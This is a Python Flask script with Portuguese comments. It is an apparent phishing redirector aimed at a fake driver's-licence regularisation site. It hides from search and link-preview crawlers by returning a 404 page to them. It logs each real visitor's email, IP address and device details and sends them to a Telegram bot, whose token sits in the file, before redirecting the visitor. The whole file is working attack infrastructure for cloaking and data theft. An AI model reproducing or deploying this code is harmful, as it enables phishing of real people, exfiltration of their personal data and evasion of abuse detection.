import os
from flask import Flask, request, redirect
import requests

app = Flask(__name__)

# --- CONFIGURAÇÕES ---
TELEGRAM_TOKEN = '8906811429:AAE5xELLBsXG_lu-Pve0XLRWIHzeJlqC8xc'
TELEGRAM_CHAT_ID = '8535923335'
URL_DESTINO = 'https://regularizecnh.com'

# Lista de palavras-chave de bots e filtros (Cloaking)
BOT_KEYWORDS = [
    'bot', 'crawl', 'spider', 'slurp', 'google', 'bing', 'yahoo', 'facebook', 
    'whatsapp', 'telegram', 'microsoft', 'linkedin', 'slack', 'twitter', 'bot-http'
]

def is_bot(user_agent):
    if not user_agent:
        return True
    ua = user_agent.lower()
    return any(keyword in ua for keyword in BOT_KEYWORDS)

def send_telegram(data):
    msg = (
        f"🚀 **Novo Lead Capturado!**\n\n"
        f"📧 Email: {data['email']}\n"
        f"🌐 IP: {data['ip']}\n"
        f"📱 Dispositivo: {data['ua']}\n"
        f"⏰ Data: {data['data']}"
    )
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    requests.post(url, data={'chat_id': TELEGRAM_CHAT_ID, 'text': msg, 'parse_mode': 'Markdown'})

@app.route('/')
@app.route('/<path:path>')
def bridge(path=""):
    ua = request.headers.get('User-Agent', '')
    
    # 1. Filtro de Cloaking (Se for bot, manda pra página neutra ou erro)
    if is_bot(ua):
        return "<h1>404 Not Found</h1>", 404

    # 2. Captura de Dados
    email = request.args.get('email', 'Não informado')
    lead_data = {
        'email': email,
        'ip': request.remote_addr,
        'ua': ua,
        'data': request.date
    }

    # 3. Envio para o Telegram (Não trava o redirecionamento)
    try:
        send_telegram(lead_data)
    except:
        pass

    # 4. Redirecionamento Final
    return redirect(URL_DESTINO, code=302)

if __name__ == "__main__":
    app.run()
